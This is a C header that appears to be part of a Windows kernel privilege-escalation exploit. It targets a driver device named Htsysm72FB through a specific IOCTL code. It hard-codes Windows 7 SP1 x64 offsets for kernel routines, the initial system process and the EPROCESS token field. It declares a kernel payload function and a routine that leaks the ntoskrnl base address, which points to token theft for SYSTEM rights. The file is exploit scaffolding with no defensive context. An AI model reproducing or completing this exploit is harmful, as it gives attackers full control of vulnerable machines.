#pragma once

#include <Windows.h>
#include <stdio.h>

#include "intrinsics.h"
#include "kernel_definitions.h"

#define DEVICE_OBJECT "\\\\.\\GLOBALROOT\\Device\\Htsysm72FB"
#define TARGET_IOCTL_BRANCH 0xAA013044

#define MMGETSYSTEMROUTINEADDRESS_OFFSET_WIN7SP1X64 0x327918
#define RTLINITUNICODESTRING_OFFSET_WIN7SP1X64 0x26450
#define PSINITIALSYSTEMPROCESS_OFFSET_WIN7SP1X64 0x29E028

#define EPROCESS_TOKEN_OFFSET_WIN7SP1X64 0x208

int main(int argc, char** argv);
NTSTATUS kernel_payload();

void* leak_ntoskrnl_base_address();